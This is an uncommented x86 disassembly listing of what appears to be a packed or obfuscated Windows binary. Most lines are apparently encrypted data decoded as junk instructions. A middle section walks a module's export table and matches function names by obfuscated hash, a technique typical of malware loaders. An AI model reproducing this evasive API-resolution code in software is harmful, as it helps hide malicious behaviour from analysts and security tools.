  4062b8:	adc    BYTE PTR [edx-0x31],0xb9
  4062bc:	test   DWORD PTR [eax],edi
  4062be:	fcmovnb st,st(2)
  4062c0:	stos   DWORD PTR es:[edi],eax
  4062c1:	fsub   DWORD PTR [esi]
  4062c3:	pop    esp
  4062c4:	push   ds
  4062c5:	add    bl,BYTE PTR [esi]
  4062c7:	mov    esp,0xca4ad496
  4062cc:	xor    al,0xa2
  4062ce:	xor    al,0x2f
  4062d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062d1:	pop    ecx
  4062d2:	jb     0x40634f
  4062d4:	sub    BYTE PTR es:[eax],al
  4062d7:	dec    edi
  4062d8:	and    ch,BYTE PTR [ecx]
  4062da:	cld    
  4062db:	and    al,0xe7
  4062dd:	scas   eax,DWORD PTR es:[edi]
  4062de:	stc    
  4062df:	xchg   ebp,eax
  4062e0:	cs mov esi,0x97d145ad
  4062e6:	jmp    0x406342
  4062e8:	leave  
  4062e9:	inc    DWORD PTR [ebp+edi*1+0x66]
  4062ed:	push   es
  4062ee:	fst    st(3)
  4062f0:	aam    0xa
  4062f2:	pusha  
  4062f3:	mov    ebx,0x2e188ce8
  4062f8:	scas   al,BYTE PTR es:[edi]
  4062f9:	dec    ebp
  4062fa:	lea    edx,[edi]
  4062fc:	pop    ds
  4062fd:	(bad)  
  4062fe:	mov    ds:0x65cc1330,al
  406303:	cmp    dh,bh
  406305:	adc    ch,cl
  406307:	jne    0x406313
  406309:	das    
  40630a:	xor    DWORD PTR [ecx+0x2f21b5b2],esi
  406310:	xor    eax,0x92c41e08
  406315:	pusha  
  406316:	sti    
  406317:	sbb    ecx,DWORD PTR [ebx+0x73]
  40631a:	(bad)  
  40631b:	rcl    ebp,1
  40631d:	and    al,0x1f
  40631f:	stos   BYTE PTR es:[edi],al
  406320:	mov    esp,0x8509fe3a
  406325:	push   ds
  406326:	aad    0x4c
  406328:	fcmovbe st,st(1)
  40632a:	mov    BYTE PTR [edi+0x78],cl
  40632d:	js     0x4062e8
  40632f:	mov    eax,0x3ca36175
  406335:	rcr    DWORD PTR [esi-0x5d],1
  406338:	sbb    eax,0x5c7d548f
  40633d:	mov    al,ds:0xa795b043
  406342:	mov    edx,0xcdfbd9e3
  406347:	into   
  406348:	dec    ecx
  406349:	pop    es
  40634a:	enter  0xd6d4,0x44
  40634e:	in     al,0x5b
  406350:	cmp    esi,DWORD PTR [edi]
  406352:	(bad)  
  406353:	sahf   
  406354:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406355:	push   0x1d28e019
  40635a:	cmp    BYTE PTR [ecx-0x293fd23d],cl
  406360:	arpl   WORD PTR [esi+0x7e],si
  406363:	xor    ch,dl
  406365:	idiv   BYTE PTR [edi-0x13]
  406368:	mov    DWORD PTR [eax],ecx
  40636a:	hlt    
  40636b:	test   BYTE PTR [edi],ah
  40636d:	sahf   
  40636e:	add    eax,0x54fef94f
  406373:	data16 loope 0x406322
  406376:	mov    WORD PTR [ebp+eiz*2+0x67],?
  40637a:	add    al,0xd7
  40637c:	pop    ebp
  40637d:	stos   DWORD PTR es:[edi],eax
  40637e:	jbe    0x406327
  406380:	cmp    cl,BYTE PTR [ebp+edx*8+0x3a351623]
  406387:	jo     0x406311
  406389:	daa    
  40638a:	and    eax,0xdab4aa35
  40638f:	imul   esi,DWORD PTR [edx+0x3d],0xffffffeb
  406393:	push   0xfffffff4
  406395:	stc    
  406396:	cmc    
  406397:	jne    0x4063c5
  406399:	in     al,0xa3
  40639b:	fldenv [esi]
  40639d:	dec    eax
  40639e:	and    al,0xd2
  4063a0:	aad    0x37
  4063a2:	jo     0x40636f
  4063a4:	repnz cmp DWORD PTR [edx-0x5e],esp
  4063a8:	or     esp,DWORD PTR [ecx]
  4063aa:	push   edx
  4063ab:	xchg   edi,eax
  4063ac:	jbe    0x4063cb
  4063ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063af:	ins    BYTE PTR es:[edi],dx
  4063b0:	push   0x2a80fe39
  4063b5:	out    0x1,al
  4063b7:	xor    DWORD PTR [ebx-0x5e7a4544],edi
  4063bd:	loop   0x4063e5
  4063bf:	in     al,0x82
  4063c1:	arpl   WORD PTR [esi+eax*2+0x21],sp
  4063c5:	lahf   
  4063c6:	add    BYTE PTR [esi+0x1a55f83f],0x49
  4063cd:	xlat   BYTE PTR ds:[ebx]
  4063ce:	push   0x40
  4063d0:	or     eax,0xb1b9d9fc
  4063d5:	icebp  
  4063d6:	mov    bl,0x59
  4063d8:	rol    DWORD PTR [ecx-0x23],0x39
  4063dc:	jp     0x4063a9
  4063de:	pop    ecx
  4063df:	(bad)  
  4063e0:	jmp    0x8d1:0xe64f54f3
  4063e7:	sbb    BYTE PTR [ecx+0x28],al
  4063ea:	push   0x3f
  4063ec:	mov    al,0xbe
  4063ee:	pop    esi
  4063ef:	xchg   edi,eax
  4063f0:	xchg   esi,eax
  4063f1:	mov    ebp,0x4b1e856e
  4063f6:	cs into 
  4063f8:	adc    esp,0x2c8c2b43
  4063fe:	jbe    0x406454
  406400:	mov    ebx,DWORD PTR ds:0xbf5824f7
  406406:	inc    ebx
  406407:	in     al,dx
  406408:	arpl   WORD PTR [eax-0x2b],dx
  40640b:	cmp    DWORD PTR [ecx+0x6b6caead],esp
  406411:	ins    BYTE PTR es:[edi],dx
  406412:	inc    edi
  406413:	ins    BYTE PTR es:[edi],dx
  406414:	jle    0x4063fb
  406416:	sar    DWORD PTR [ecx-0x5e8a80b8],0x7b
  40641d:	cdq    
  40641e:	xchg   ebp,eax
  40641f:	lods   eax,DWORD PTR ds:[esi]
  406420:	cmp    al,0xe3
  406422:	bound  esp,QWORD PTR [edi]
  406424:	dec    ecx
  406425:	mov    eax,ds:0xc75c44bb
  40642a:	mov    esi,fs
  40642c:	and    edx,0x7e
  40642f:	push   cs
  406430:	ins    DWORD PTR es:[edi],dx
  406431:	cdq    
  406432:	loopne 0x4063ca
  406434:	in     eax,0x66
  406436:	sbb    eax,DWORD PTR [edi-0x13727ea5]
  40643c:	and    al,0x29
  40643e:	xor    BYTE PTR [edx],0x64
  406441:	(bad)  
  406443:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406444:	pop    esp
  406445:	cmp    eax,0x72e67793
  40644a:	rsm    
  40644c:	cmp    eax,0x590e0691
  406451:	fist   WORD PTR [edx+0x3c2f8ee4]
  406457:	stc    
  406458:	xor    eax,0xa2c76e59
  40645d:	imul   edx,DWORD PTR [edx],0x1b
  406460:	repnz pusha 
  406462:	cmp    dl,cl
  406464:	ret    
  406465:	jne    0x4064ab
  406467:	int    0x6c
  406469:	out    0x7e,eax
  40646b:	sbb    eax,0xe1a62d82
  406470:	pushf  
  406471:	pop    esi
  406472:	(bad)  
  406473:	jnp    0x4064f2
  406475:	popf   
  406476:	pop    esp
  406477:	lods   al,BYTE PTR ds:[esi]
  406478:	xchg   DWORD PTR [edi],ebx
  40647a:	pop    es
  40647b:	dec    ebx
  40647c:	or     al,0x58
  40647e:	(bad)  
  40647f:	fmul   DWORD PTR [ebx]
  406481:	ja     0x406465
  406483:	lods   al,BYTE PTR ds:[esi]
  406484:	jae    0x4064e2
  406486:	stos   BYTE PTR es:[edi],al
  406487:	sbb    DWORD PTR cs:[ecx-0x40],ecx
  40648b:	add    DWORD PTR [edi],ecx
  40648d:	sbb    DWORD PTR ds:0xdd38dd3d,edx
  406493:	push   edx
  406494:	ss in  eax,dx
  406496:	sub    al,BYTE PTR [ebx]
  406498:	cmc    
  406499:	outs   dx,DWORD PTR ds:[esi]
  40649a:	sub    DWORD PTR [ebx-0x7e],esp
  40649d:	popf   
  40649e:	xor    al,0xe
  4064a0:	call   0x87d1:0xd3a4e752
  4064a7:	cmp    eax,0x99121075
  4064ac:	add    BYTE PTR [esi+0x5a],0x40
  4064b0:	xchg   ecx,eax
  4064b1:	mov    edi,edx
  4064b3:	mov    ecx,0x4f30a508
  4064b8:	repnz push cs
  4064ba:	add    eax,0x36c15500
  4064bf:	add    DWORD PTR [eax+ebp*4-0x47],ebp
  4064c3:	xchg   ebx,eax
  4064c4:	cmp    al,0xd9
  4064c6:	sbb    BYTE PTR [esi-0xe],cl
  4064c9:	jb     0x406496
  4064cb:	pop    eax
  4064cc:	data16 add dh,BYTE PTR ds:0x9d8c2ff3
  4064d3:	mov    al,ds:0x2a73e16d
  4064d8:	in     al,dx
  4064d9:	loopne 0x4064d7
  4064db:	jge    0x4064bc
  4064dd:	clc    
  4064de:	jg     0x406487
  4064e0:	pcmpgtb mm1,QWORD PTR [ecx-0x27]
  4064e4:	(bad)  
  4064e6:	dec    ecx
  4064e7:	test   al,0xf
  4064e9:	xchg   esi,eax
  4064ea:	mov    dh,BYTE PTR [eax-0x17272a6e]
  4064f0:	dec    ebp
  4064f1:	sbb    ecx,DWORD PTR ds:0x719ad14
  4064f7:	xor    cl,bh
  4064f9:	es pop ds
  4064fb:	popf   
  4064fc:	in     al,dx
  4064fd:	mov    ah,0x8a
  4064ff:	ds xor edi,ebp
  406502:	ret    0x37e1
  406505:	imul   edx,DWORD PTR [ebx],0x52
  406508:	dec    ecx
  406509:	nop
  40650a:	add    BYTE PTR [esi],bh
  40650c:	or     DWORD PTR [ebp+eax*2-0x69f1508a],ebp
  406513:	or     al,0x17
  406515:	jbe    0x4064bd
  406517:	test   DWORD PTR [edx+0x1c9928f4],ebp
  40651d:	aaa    
  40651e:	inc    ebx
  40651f:	aad    0x40
  406521:	add    BYTE PTR [ebp-0x30c36684],al
  406527:	adc    eax,0xdba1e62
  40652c:	in     al,0x5
  40652e:	sub    BYTE PTR ds:0x34566871,cl
  406534:	aaa    
  406535:	fwait
  406536:	add    BYTE PTR [eax-0x6b],0x7f
  40653a:	(bad)  
  40653b:	fsubr  st(6),st
  40653d:	mov    esp,0x29694808
  406542:	(bad)  
  406544:	add    ecx,DWORD PTR [esi+ecx*4-0x6e]
  406548:	stc    
  406549:	xlat   BYTE PTR ds:[ebx]
  40654a:	xchg   edi,eax
  40654b:	cmp    eax,0x45a39579
  406550:	pop    edi
  406551:	mov    ss:0xb2298383,eax
  406557:	loopne 0x40651f
  406559:	jne    0x406511
  40655b:	adc    BYTE PTR [edi+0x10],ah
  40655e:	jne    0x406578
  406560:	ror    DWORD PTR [edx+0x6e],1
  406563:	das    
  406564:	mov    bl,0x30
  406566:	xchg   esi,eax
  406567:	xor    dh,cl
  406569:	mov    eax,0x4f28b81
  40656e:	xchg   ch,bl
  406570:	mov    eax,0x9f9ce32a
  406575:	add    eax,edx
  406577:	mov    ecx,0x6ecfc4fa
  40657c:	cli    
  40657d:	cmp    ch,BYTE PTR [ecx-0x2b4a7f39]
  406583:	jl     0x4065a4
  406585:	add    al,0x55
  406587:	rcl    BYTE PTR [edi+0x39],cl
  40658a:	hlt    
  40658b:	nop
  40658c:	lods   eax,DWORD PTR ds:[esi]
  40658d:	mov    ecx,0x7ed9946f
  406592:	add    edx,ecx
  406594:	push   ebp
  406595:	fcomi  st,st(6)
  406597:	cmp    DWORD PTR [edx],eax
  406599:	jmp    0x4065a7
  40659b:	enter  0x1116,0x3c
  40659f:	pop    esi
  4065a0:	mov    cl,0xc1
  4065a2:	mov    esi,0x55edfdc4
  4065a7:	adc    ebp,DWORD PTR [ebp+0x66]
  4065aa:	mov    ds:0x5335206c,al
  4065af:	call   0x9a7928e8
  4065b4:	hlt    
  4065b5:	(bad)  
  4065b6:	(bad)  
  4065b7:	jbe    0x40655c
  4065b9:	retf   
  4065ba:	mov    ds:0x2bfca438,al
  4065bf:	in     eax,dx
  4065c0:	pop    ebx
  4065c1:	jb     0x4065f4
  4065c3:	jb     0x406556
  4065c5:	and    cl,BYTE PTR [edi]
  4065c7:	add    edx,DWORD PTR [ebp+0x38639276]
  4065cd:	jns    0x406559
  4065cf:	aad    0xe7
  4065d1:	cmp    DWORD PTR [ecx+0x7328a9ea],ebp
  4065d7:	call   0xa394dec
  4065dc:	das    
  4065dd:	ins    BYTE PTR es:[edi],dx
  4065de:	mov    esp,0x77cc4a18
  4065e3:	lods   al,BYTE PTR ds:[esi]
  4065e4:	clc    
  4065e5:	mov    BYTE PTR [ebp*2+0x25968d5e],ch
  4065ec:	(bad)  
  4065ed:	int    0xff
  4065ef:	sbb    DWORD PTR ds:0x426000,0x42900c
  4065f9:	xor    ecx,ebx
  4065fb:	xor    DWORD PTR ds:0x425008,0xe68
  406605:	xor    edx,ebx
  406607:	mov    DWORD PTR ds:0x427008,0xa36
  406611:	cmp    edx,ecx
  406613:	mov    DWORD PTR ds:0x425000,0x1171
  40661d:	je     0x40684c
  406623:	mov    ecx,DWORD PTR [ebp-0x4]
  406626:	xor    ecx,ebx
  406628:	adc    DWORD PTR ds:0x427000,0x2a26
  406632:	add    ecx,eax
  406634:	cmp    esi,ecx
  406636:	jne    0x4067ef
  40663c:	push   DWORD PTR [ebp+0x8]
  40663f:	call   0x415b52
  406644:	mov    ecx,DWORD PTR ds:0x41d28c
  40664a:	mov    ecx,DWORD PTR [ecx]
  40664c:	and    DWORD PTR ds:0x42900c,ecx
  406652:	mov    DWORD PTR [ebp-0x18],eax
  406655:	mov    eax,DWORD PTR [ebp-0x4]
  406658:	mov    DWORD PTR ds:0x428018,0x10
  406662:	cmp    DWORD PTR ds:0x428018,0x0
  406669:	je     0x4066c2
  40666f:	cmp    DWORD PTR ds:0x428018,0x7
  406676:	jne    0x406685
  40667c:	push   DWORD PTR [ebp-0x28]
  40667f:	call   DWORD PTR ds:0x421004
  406685:	cmp    DWORD PTR ds:0x428018,0x8
  40668c:	jne    0x40669f
  406692:	mov    edi,DWORD PTR ds:0x428018
  406698:	dec    edi
  406699:	mov    DWORD PTR ds:0x428018,edi
  40669f:	mov    edi,DWORD PTR ds:0x428018
  4066a5:	dec    edi
  4066a6:	mov    DWORD PTR ds:0x428018,edi
  4066ac:	jmp    0x406662
  4066b1:	mov    ecx,DWORD PTR ds:0x41ffef
  4066b7:	mov    edi,DWORD PTR ds:0x41d254
  4066bd:	sub    edi,ecx
  4066bf:	add    ecx,DWORD PTR [ecx+edi*1]
  4066c2:	mov    ecx,DWORD PTR [ebp-0x18]
  4066c5:	xor    eax,ebx
  4066c7:	mov    edi,0x3272db
  4066cc:	add    eax,edi
  4066ce:	mov    DWORD PTR ds:0x425008,0x2bfa
  4066d8:	cmp    ecx,eax
  4066da:	je     0x4068bc
  4066e0:	sbb    DWORD PTR ds:0x426000,0x426010
  4066ea:	push   DWORD PTR [ebp-0x18]
  4066ed:	push   DWORD PTR [ebp+0x8]
  4066f0:	call   0x417fa0
  4066f5:	sbb    DWORD PTR ds:0x42601c,ecx
  4066fb:	mov    DWORD PTR [ebp-0x18],eax
  4066fe:	dec    eax
  4066ff:	mov    eax,DWORD PTR [ebp-0x4]
  406702:	and    DWORD PTR ds:0x425018,0x0
  40670c:	jmp    0x40671e
  406711:	mov    ecx,DWORD PTR ds:0x425018
  406717:	inc    ecx
  406718:	mov    DWORD PTR ds:0x425018,ecx
  40671e:	cmp    DWORD PTR ds:0x425018,0x1e
  406725:	jae    0x40674c
  40672b:	cmp    DWORD PTR ds:0x425018,0x2e
  406732:	jne    0x406741
  406738:	push   DWORD PTR [ebp-0x20]
  40673b:	call   DWORD PTR ds:0x421048
  406741:	jmp    0x406711
  406746:	sbb    ecx,DWORD PTR ds:0x42900c
  40674c:	mov    ecx,DWORD PTR [ebp-0x18]
  40674f:	xor    DWORD PTR ds:0x425000,0x426004
  406759:	xor    eax,ebx
  40675b:	sub    DWORD PTR ds:0x42900c,0x26ad
  406765:	add    eax,edi
  406767:	cmp    ecx,eax
  406769:	mov    DWORD PTR ds:0x42501c,0x148e
  406773:	je     0x4068bc
  406779:	mov    eax,DWORD PTR [ebp-0x18]
  40677c:	mov    eax,DWORD PTR [eax+0x18]
  40677f:	mov    ecx,DWORD PTR ds:0x42500c
  406785:	or     DWORD PTR ds:0x428014,ecx
  40678b:	mov    DWORD PTR [ebp-0x24],eax
  40678e:	mov    eax,DWORD PTR [ebp-0x18]
  406791:	mov    ecx,DWORD PTR [ebp+0x8]
  406794:	add    ecx,DWORD PTR [eax+0x20]
  406797:	mov    DWORD PTR [ebp-0x2c],ecx
  40679a:	and    eax,eax
  40679c:	mov    eax,DWORD PTR [ebp-0x18]
  40679f:	and    ecx,DWORD PTR ds:0x427000
  4067a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4067a8:	adc    DWORD PTR ds:0x425004,0x721
  4067b2:	add    ecx,DWORD PTR [eax+0x24]
  4067b5:	movzx  eax,WORD PTR ds:0x428004
  4067bc:	sbb    eax,DWORD PTR ds:0x42801c
  4067c2:	mov    ds:0x428004,eax
  4067c7:	mov    DWORD PTR [ebp-0x34],ecx
  4067ca:	or     DWORD PTR ds:0x429008,edx
  4067d0:	mov    eax,DWORD PTR [ebp-0x18]
  4067d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4067d6:	sbb    DWORD PTR ds:0x427018,0x427008
  4067e0:	add    ecx,DWORD PTR [eax+0x1c]
  4067e3:	not    eax
  4067e5:	mov    eax,edi
  4067e7:	mov    DWORD PTR [ebp-0x18],ecx
  4067ea:	jmp    0x406884
  4067ef:	movzx  ecx,BYTE PTR ds:0x428010
  4067f6:	add    ecx,DWORD PTR ds:0x42700c
  4067fc:	mov    DWORD PTR ds:0x428010,ecx
  406802:	mov    ecx,DWORD PTR [ebp-0x2c]
  406805:	xor    DWORD PTR ds:0x425004,edi
  40680b:	mov    edx,DWORD PTR [ebp+0x8]
  40680e:	and    DWORD PTR ds:0x425020,0x42901c
  406818:	add    edx,DWORD PTR [ecx+esi*4]
  40681b:	inc    ecx
  40681c:	mov    DWORD PTR [ebp-0x28],edx
  40681f:	sub    DWORD PTR ds:0x425000,ecx
  406825:	mov    ecx,DWORD PTR [ebp-0x4]
  406828:	sbb    DWORD PTR ds:0x42500c,0xc10
  406832:	mov    edx,DWORD PTR [ebp-0x28]
  406835:	xor    ecx,ebx
  406837:	dec    DWORD PTR ds:0x42600c
  40683d:	add    ecx,eax
  40683f:	cmp    edx,ecx
  406841:	je     0x406884
  406847:	jmp    0x406870
  40684c:	mov    ecx,DWORD PTR [ebp-0x4]
  40684f:	mov    edx,DWORD PTR [ebp-0x8]
  406852:	xor    ecx,ebx
  406854:	add    ecx,eax
  406856:	cmp    edx,ecx
  406858:	je     0x4068c8
  40685e:	mov    ecx,DWORD PTR [ebp-0x4]
  406861:	mov    edx,DWORD PTR [ebp-0x30]
  406864:	xor    ecx,ebx
  406866:	add    ecx,eax
  406868:	cmp    edx,ecx
  40686a:	je     0x4068d7
  406870:	lea    eax,[ebp-0x8]
  406873:	push   eax
  406874:	push   DWORD PTR [ebp-0x28]
  406877:	push   DWORD PTR [ebp+0xc]
  40687a:	call   0x401000
  40687f:	mov    eax,0x3272db
  406884:	mov    ecx,DWORD PTR [ebp-0x4]
  406887:	mov    edx,DWORD PTR [ebp-0x8]
  40688a:	xor    ecx,ebx
  40688c:	add    ecx,eax
  40688e:	cmp    edx,ecx
  406890:	je     0x4068ab
  406896:	mov    ecx,DWORD PTR [ebp-0x34]
  406899:	movzx  ecx,WORD PTR [ecx+esi*2]
  40689d:	mov    edx,DWORD PTR [ebp-0x18]
  4068a0:	mov    ecx,DWORD PTR [edx+ecx*4]
  4068a3:	mov    DWORD PTR [ebp-0x38],ecx
  4068a6:	jmp    0x40684c
  4068ab:	mov    ecx,DWORD PTR [ebp-0x14]
  4068ae:	xor    ecx,ebx
  4068b0:	lea    esi,[esi+ecx*1+0x3272db]
  4068b7:	jmp    0x40427f
  4068bc:	mov    eax,DWORD PTR [ebp-0x4]
  4068bf:	xor    eax,ebx
  4068c1:	add    eax,edi
  4068c3:	jmp    0x408d90
  4068c8:	mov    eax,DWORD PTR [ebp-0x4]
  4068cb:	xor    eax,ebx
  4068cd:	add    eax,0x3272db
  4068d2:	jmp    0x408d90
  4068d7:	mov    ecx,DWORD PTR [ebp-0x38]
  4068da:	add    ecx,DWORD PTR [ebp+0x8]
  4068dd:	mov    DWORD PTR [ebp-0x10],ecx
  4068e0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4068e3:	test   ecx,ecx
  4068e5:	je     0x408d1b
  4068eb:	mov    DWORD PTR [ebp-0x20],0x0
  4068f2:	push   0x3
  4068f4:	xor    edx,edx
  4068f6:	pop    edx
  4068f7:	add    edx,0x8
  4068fa:	push   edx
  4068fb:	pop    ecx
  4068fc:	push   0x6
  4068fe:	dec    ecx
  4068ff:	pop    ebx
  406900:	dec    ebx
  406901:	xchg   ebx,ecx
  406903:	sub    ebx,ecx
  406905:	xchg   ebx,ecx
  406907:	dec    ecx
  406908:	mov    eax,DWORD PTR [ebp-0x1c]
  40690b:	imul   eax,ecx
  40690e:	sub    esp,eax
  406910:	mov    DWORD PTR [ebp-0x20],esp
  406913:	mov    eax,DWORD PTR [ebp-0x4]
  406916:	mov    ecx,0x7510893
  40691b:	xor    eax,ecx
  40691d:	mov    edx,0x3272db
  406922:	add    eax,edx
  406924:	mov    DWORD PTR [ebp+0x8],eax
  406927:	mov    eax,DWORD PTR [ebp-0x14]
  40692a:	xor    eax,ecx
  40692c:	add    eax,edx
  40692e:	mov    edx,DWORD PTR [ebp+0x14]
  406931:	imul   eax,DWORD PTR [edx]
  406934:	mov    edx,DWORD PTR [ebp-0x4]
  406937:	xor    edx,ecx
  406939:	mov    ecx,DWORD PTR [ebp+0x8]
  40693c:	lea    ecx,[edx+ecx*1+0x3272db]
  406943:	cmp    ecx,eax
  406945:	je     0x408d11
  40694b:	mov    edi,DWORD PTR [ebp-0x14]
  40694e:	mov    eax,DWORD PTR [ebp+0x8]
  406951:	mov    edx,DWORD PTR [ebp+0x14]
  406954:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  406958:	mov    ecx,0x7510893
  40695d:	xor    edx,edx
  40695f:	xor    edi,ecx
  406961:	mov    esi,0x3272db
  406966:	add    edi,esi
  406968:	div    edi
  40696a:	mov    edx,DWORD PTR [ebp-0x4]
  40696d:	xor    edx,ecx
  40696f:	lea    eax,[edx+eax*1+0x3272db]
  406976:	mov    edx,DWORD PTR [ebp+0x8]
  406979:	mov    edi,DWORD PTR [ebp-0x20]
  40697c:	mov    DWORD PTR [edi+edx*4],eax
  40697f:	mov    eax,DWORD PTR [ebp-0x14]
  406982:	mov    edx,DWORD PTR [ebp+0x8]
  406985:	xor    eax,ecx
  406987:	lea    eax,[eax+edx*1+0x3272db]
  40698e:	mov    DWORD PTR [ebp+0x8],eax
  406991:	mov    eax,DWORD PTR [ebp-0x14]
  406994:	mov    edx,DWORD PTR [ebp+0x14]
  406997:	xor    eax,ecx
  406999:	add    eax,esi
  40699b:	imul   eax,DWORD PTR [edx]
  40699e:	mov    edx,DWORD PTR [ebp-0x4]
  4069a1:	xor    edx,ecx
  4069a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4069a6:	lea    ecx,[edx+ecx*1+0x3272db]
  4069ad:	cmp    ecx,eax
  4069af:	jmp    0x408d04
  4069b4:	into   
  4069b5:	mov    BYTE PTR [ecx],bl
  4069b7:	(bad)  
  4069b8:	adc    esp,DWORD PTR [ebx+0x10b2688d]
  4069be:	shl    DWORD PTR [ebx+0x1],0xcc
  4069c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069c3:	xchg   ebx,eax
  4069c4:	ret    0x623c
  4069c7:	bound  ebp,QWORD PTR [edx]
  4069c9:	pop    edi
  4069ca:	bound  esp,QWORD PTR [edx-0x4d]
  4069cd:	enter  0x235f,0xcb
  4069d1:	shr    BYTE PTR fs:[eax+0x31540da],1
  4069d8:	daa    
  4069d9:	mov    BYTE PTR [eax+0x4bcbe780],dh
  4069df:	mov    cl,0x28
  4069e1:	loop   0x406989
  4069e3:	(bad)  
  4069e4:	cmp    edx,DWORD PTR [eax-0x60a00c8]
  4069ea:	push   0x2344d18f
  4069ef:	lahf   
  4069f0:	lea    ecx,[eax+eiz*1-0x6c]
  4069f4:	or     edx,edx
  4069f6:	mov    bh,0xac
  4069f8:	dec    esi
  4069f9:	inc    eax
  4069fa:	(bad)  
  4069fb:	popf   
  4069fc:	xor    ebx,edi
  4069fe:	ds inc esp
  406a00:	out    0x82,al
  406a02:	adc    eax,ebx
  406a04:	ins    DWORD PTR es:[edi],dx
  406a05:	xchg   ebp,eax
  406a06:	xor    bh,ch
  406a08:	sar    ah,0xf4
  406a0b:	or     eax,0x66eed5fe
  406a10:	ror    DWORD PTR [ebx+0x6ebe37ca],cl
  406a16:	cmc    
  406a17:	icebp  
  406a18:	jns    0x406a60
  406a1a:	mov    al,ds:0x214ddd6c
  406a1f:	in     eax,dx
  406a20:	ficom  DWORD PTR [edi+esi*8]
  406a23:	(bad)  
  406a24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a25:	jb     0x406a06
  406a27:	(bad)  
  406a28:	loop   0x4069d5
  406a2a:	dec    ecx
  406a2b:	mov    bl,BYTE PTR [eax-0x5fed1d8]
  406a31:	popf   
  406a32:	or     eax,0xc40b075b
  406a37:	mov    cs,WORD PTR [ebx+0x1]
  406a3a:	in     al,dx
  406a3b:	sub    al,BYTE PTR [edi+0x4]
  406a3e:	jmp    0x406a00
  406a40:	adc    BYTE PTR [ecx-0x72],dh
  406a43:	lahf   
  406a44:	aas    
  406a45:	dec    ebx
  406a46:	ds mov eax,0x1d4fe4c
  406a4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a4d:	inc    ebp
  406a4e:	sub    BYTE PTR [ecx-0xd],bl
  406a51:	js     0x4069d5
  406a53:	sbb    bl,BYTE PTR [ecx-0x13]
  406a56:	shl    DWORD PTR [ebp+0x4684c913],cl
  406a5c:	sub    DWORD PTR [ecx],eax
  406a5e:	aaa    
  406a5f:	and    ebx,ebp
  406a61:	rcl    BYTE PTR [edi],1
  406a63:	push   ebx
  406a64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a65:	push   es
  406a66:	test   BYTE PTR [edi],cl
  406a68:	repz icebp 
  406a6a:	shr    esp,1
  406a6c:	xlat   BYTE PTR ds:[ebx]
  406a6d:	rcr    BYTE PTR [ecx],cl
  406a6f:	mov    ds:0xaf0ca1cb,al
  406a74:	idiv   edi
  406a76:	jmp    0x406a0d
  406a78:	lahf   
  406a79:	cmc    
  406a7a:	xchg   edx,eax
  406a7b:	add    cl,BYTE PTR [edx-0x207cd7c]
  406a81:	sub    eax,DWORD PTR [eax-0x3b]
  406a84:	daa    
  406a85:	jns    0x406a68
  406a87:	push   edi
  406a88:	xor    al,0xde
  406a8b:	xchg   ebp,eax
  406a8c:	call   0x250f:0xe7ce0ce1
  406a93:	inc    ebx
  406a94:	mov    BYTE PTR [edi+0x67f30996],dh
  406a9a:	jg     0x406a20
  406a9c:	xchg   ebp,edx
  406a9e:	(bad)  
  406a9f:	data16 int3 
  406aa1:	ja     0x406b17
  406aa3:	mov    dl,BYTE PTR [ebx+0x48b4900e]
  406aa9:	adc    cl,al
  406aab:	dec    esp
  406aac:	pusha  
  406aad:	and    eax,0xa74b8c62
  406ab2:	jns    0x406add
  406ab4:	dec    esp
  406ab5:	fidivr WORD PTR [edx]
  406ab7:	dec    ebp
  406ab8:	call   0x7febfbf8
  406abd:	ds es ins DWORD PTR es:[edi],dx
  406ac0:	pop    ebx
  406ac1:	push   ecx
  406ac2:	sar    DWORD PTR [edi-0x56],0x49
  406ac6:	lods   eax,DWORD PTR ds:[esi]
  406ac7:	push   edx
  406ac8:	in     al,dx
  406ac9:	xor    eax,0x77a7eeae
  406ace:	vsubss xmm6,xmm1,DWORD PTR [eax]
  406ad2:	push   esi
  406ad3:	mov    BYTE PTR [esi-0x6b],dh
  406ad6:	shl    edx,0x5b
  406ad9:	push   ss
  406ada:	mov    dh,0xc0
  406adc:	mov    ch,0x4b
  406ade:	sbb    al,0x6f
  406ae0:	sub    eax,0xe8bf71d6
  406ae5:	jo     0x406aac
  406ae7:	test   dl,ah
  406ae9:	das    
  406aea:	cmp    edx,eax
  406aec:	loop   0x406b6c
  406aee:	mov    dh,ch
  406af0:	into   
  406af1:	sahf   
  406af2:	(bad)  
  406af3:	and    bh,al
  406af5:	cmp    al,BYTE PTR [edx-0x24e89052]
  406afb:	adc    dl,al
  406afd:	fwait
  406afe:	dec    ebp
  406aff:	mov    eax,0x8a6a3d0
  406b04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b05:	cmp    BYTE PTR [esi-0x4344d663],ch
  406b0b:	call   0xcdac:0xcec6d9d4
  406b12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b13:	into   
  406b14:	ret    
  406b15:	cmp    al,0x8c
  406b17:	ror    DWORD PTR [eax+edx*4-0x3cf711de],1
  406b1e:	out    0x3,eax
  406b20:	mov    bl,BYTE PTR [ecx]
  406b22:	or     DWORD PTR [edx],0x74
  406b25:	pop    ebx
  406b26:	add    cl,cl
  406b28:	out    dx,al
  406b29:	ret    
  406b2a:	inc    ecx
  406b2b:	inc    esi
  406b2c:	out    dx,al
  406b2d:	jb     0x406b30
  406b2f:	jnp    0x406b4d
  406b31:	dec    ebx
  406b32:	pop    esi
  406b33:	dec    eax
  406b34:	call   0x9b84f7df
  406b39:	and    al,0xd5
  406b3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b3c:	retf   
  406b3d:	jbe    0x406bb2
  406b3f:	jg     0x406b4e
  406b41:	stc    
  406b42:	ins    DWORD PTR es:[edi],dx
  406b43:	lds    eax,FWORD PTR [edi]
  406b45:	loop   0x406bb6
  406b47:	jb     0x406b0b
  406b49:	inc    ebx
  406b4a:	and    DWORD PTR [edi],eax
